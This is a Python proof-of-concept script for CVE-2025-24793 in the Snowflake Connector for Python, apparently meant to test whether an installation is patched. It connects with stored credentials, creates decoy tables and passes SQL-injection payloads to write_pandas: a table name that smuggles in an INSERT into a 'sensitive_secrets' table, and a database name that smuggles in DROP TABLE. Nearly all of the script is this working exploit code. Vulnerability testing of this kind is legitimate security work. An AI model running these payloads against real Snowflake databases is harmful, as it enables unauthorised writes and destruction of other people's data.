# poc.py

import toml
import snowflake.connector
from snowflake.connector.pandas_tools import write_pandas
import pandas as pd
import traceback

def load_snowflake_config():
    config = toml.load("config.toml")
    conn = config["connections"]["my_example_connection"]
    return {
        "account": conn["account"],
        "user": conn["user"],
        "password": conn["password"],
        "role": conn["role"],
        "warehouse": conn["warehouse"],
        "database": conn["database"],
        "schema": conn["schema"]
    }

def test_write_pandas(cursor, conn, df, table_name, db=None):
    try:
        print(f"[INFO] Writing DataFrame to table: {table_name}")
        # Try writing using potential vulnerable API
        write_pandas(conn, df, table_name=table_name, database=db, auto_create_table=True)
        print(f"✅ [SUCCESS] DataFrame written to {table_name}")
    except Exception as e:
        print(f"❌ [ERROR] {str(e)}")

def check_patch(cursor):
    try:
        import inspect
        import snowflake.connector.pandas_tools
        if "stage_location" in inspect.getsource(snowflake.connector.pandas_tools.write_pandas):
            print("❌ [UNPATCHED] Vulnerable 'stage_location' argument found in write_pandas")
        else:
            print("✅ [PATCHED] No 'stage_location' parameter present")
    except Exception:
        print("⚠️  [UNKNOWN] Cannot determine patch status")

def setup_environment(cursor):
    cursor.execute("CREATE OR REPLACE TABLE legitimate_users(id INT, name STRING);")
    cursor.execute("CREATE OR REPLACE TABLE sensitive_secrets(id INT, secret STRING);")
    print("[SETUP] Created legitimate_users and sensitive_secrets tables")

def cleanup_environment(cursor):
    cursor.execute("DROP TABLE IF EXISTS legitimate_users;")
    cursor.execute("DROP TABLE IF EXISTS sensitive_secrets;")
    print("✅ [CLEANUP] Test tables removed")

def run_poc():
    print("="*60)
    print("CVE-2025-24793 PoC: Snowflake Connector Python - Auto Detection")
    print("="*60)

    config = load_snowflake_config()
    conn = snowflake.connector.connect(**config)
    cursor = conn.cursor()

    try:
        setup_environment(cursor)
        check_patch(cursor)

        # Sample DataFrame
        df = pd.DataFrame({"id": [1], "name": ["Nizen"]})

        print("\n[TEST 1] Normal write_pandas usage:")
        test_write_pandas(cursor, conn, df, "test_employees")

        print("\n[TEST 2] SQL Injection via malicious table name:")
        malicious_table = "injected_table; INSERT INTO sensitive_secrets VALUES (999, 'HACKED_VIA_CVE_2025_24793'); --"
        test_write_pandas(cursor, conn, df, malicious_table)

        print("\n[TEST 3] SQL Injection via malicious database name:")
        malicious_db = "POC_DB'; DROP TABLE sensitive_secrets; SELECT 'injected"
        test_write_pandas(cursor, conn, df, "legitimate_users", db=malicious_db)

    except Exception as e:
        print(f"❌ [FATAL ERROR] {str(e)}")
        traceback.print_exc()
    finally:
        cleanup_environment(cursor)
        cursor.close()
        conn.close()

    print("="*60)
    print("CVE-2025-24793 PoC Complete")
    print("="*60)

if __name__ == "__main__":
    run_poc()
